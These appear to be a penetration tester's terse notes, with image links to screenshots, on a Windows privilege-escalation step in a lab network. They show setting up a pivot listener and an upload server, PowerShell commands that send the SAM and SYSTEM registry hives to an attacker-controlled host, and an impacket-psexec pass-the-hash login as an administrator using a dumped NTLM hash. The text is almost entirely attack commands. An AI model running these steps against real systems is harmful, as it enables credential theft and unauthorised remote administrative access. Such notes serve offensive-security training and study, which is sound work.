![[Privilege Escalation image 15.png]]

listener_add --addr 10.10.69.147:80 --to 192.168.45.163:80 --tcp

![[Privilege Escalation image 16.png]]

python3 ~/Tools/PENTEST_and_Red/File_Transfer/SimpleHTTPServerWithUpload/SimpleHTTPServerWithUpload.py 80

powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.69.147:/', 'C:\windows.old\Windows\System32\SYSTEM')"

![[Privilege Escalation image 17.png]]

powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.69.147:/', 'C:\windows.old\Windows\System32\SAM')"

![[Privilege Escalation image 18.png]]

![[Privilege Escalation image 19.png]]

![[Privilege Escalation image 20.png]]

impacket-psexec tom_admin@10.10.69.148 -hashes :4979d69d4ca66955c075c41cf45f24dc

![[Privilege Escalation image 21.png]]